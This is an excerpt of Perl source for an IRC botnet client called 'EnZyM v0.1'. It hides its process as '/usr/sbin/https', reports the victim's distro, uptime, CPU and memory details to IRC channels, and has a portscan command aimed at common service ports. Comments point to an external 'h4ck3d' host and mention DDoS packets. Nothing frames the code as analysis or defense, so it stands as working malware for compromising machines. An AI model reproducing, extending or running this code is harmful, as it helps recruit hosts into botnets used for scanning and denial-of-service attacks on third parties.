...
my @nickname = ("PL-EnZ-");
###########################################
my $processo = '/usr/sbin/https';
my $linas_max = '8';
my $sleep = '6';
my $cmd = " ";  # http://h4ck3d.wsnw.net/mic22.txt
my $id = " "; # http://h4ck3d.wsnw.net/mic22.txt
my $pacotes = 1; # FOR WHAT ??? DDoS ????
############################################
my $nick = $nickname[rand scalar @nickname];
my $ircname = 'EnZyM';
my $realname = `uname -nmro`; # chop (my $realname = 'EnZyM');
...
sub parse {
  ...
  foreach my $canal (@channels) {
        ...
        sendraw("PRIVMSG $canal :.: EnZyM v0.1 :.");
        sendraw("PRIVMSG $canal :Distro: $MYRELEASE");
        sendraw("PRIVMSG $canal :$MYUPTIME");
        sendraw("PRIVMSG $canal :Cpu info: $MYCPUINFO");
        sendraw("PRIVMSG $canal :$MYUNAME");
	foreach my $freemem (@freemem) { 
		sendraw("PRIVMSG $canal :$freemem");
	}
}
}
...
######################
         if ($funcarg =~ /^portscan (.*)/) {
            $hostip = "$1";
            @portas=("21","22","80","443","5900","8080","8081");
